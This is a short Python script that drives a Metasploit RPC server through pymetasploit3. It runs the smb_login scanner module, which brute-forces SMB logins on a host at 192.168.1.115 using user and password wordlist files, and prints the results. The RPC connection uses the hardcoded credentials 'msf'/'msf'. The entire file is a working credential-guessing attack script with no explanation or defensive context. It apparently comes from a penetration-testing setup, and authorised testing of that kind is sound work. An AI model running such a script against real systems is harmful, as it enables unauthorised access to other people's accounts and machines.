from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient(server='192.168.1.164', username='msf', password='msf', port=55552)
exploit = client.modules.use(mtype='auxiliary', mname='scanner/smb/smb_login')
exploit['RHOSTS'] = '192.168.1.115'
exploit['THREADS'] = 5
exploit['USER_FILE'] = '/home/linpeng109/users.txt'
exploit['PASS_FILE'] = '/home/linpeng109/passwords.txt'
cid = client.consoles.console().cid
console=client.consoles.console(cid)
result = console.run_module_with_output(exploit)

print(result)
console.destroy()
